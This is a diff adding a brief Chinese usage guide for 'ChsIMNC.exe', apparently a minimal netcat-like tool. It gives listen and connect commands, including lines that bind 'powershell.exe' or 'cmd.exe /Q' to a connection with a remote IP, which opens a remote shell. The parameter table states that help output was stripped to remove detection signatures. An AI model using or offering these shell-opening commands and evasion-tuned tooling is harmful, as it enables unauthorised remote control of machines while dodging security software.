@@ -1,0 +1,20 @@
+监听端
+ChsIMNC.exe -l 1088
+连接端
+ChsIMNC.exe 192.168.31.20 1088
+
+连接端
+ChsIMNC.exe 192.168.1.10 1088 -c "powershell.exe -NoLogo -NoProfile"
+连接并指定 cmd  
+ChsIMNC.exe 192.168.1.10 1088 -c "cmd.exe /Q"
+
+
+参数	用法	说明
+-l	ChsIMNC.exe -l 1088	监听模式
+-p	ChsIMNC.exe -l -p 1088	监听模式下表示监听端口
+-p	ChsIMNC.exe 1.1.1.1 1088 -p 50000	连接模式下表示本地源端口
+-w	ChsIMNC.exe 1.1.1.1 1088 -w 5	超时时间，单位秒
+-n	ChsIMNC.exe -n 127.0.0.1 1088	禁止 DNS 解析，只用 IPv4
+-c	ChsIMNC.exe 1.1.1.1 1088 -c "cmd.exe /Q"	指定连接后执行的命令
+-v	可传，但当前精简版不输出详细信息	保留兼容
+-h / --help	当前精简版不输出帮助	为减小体积和去特征已弱化
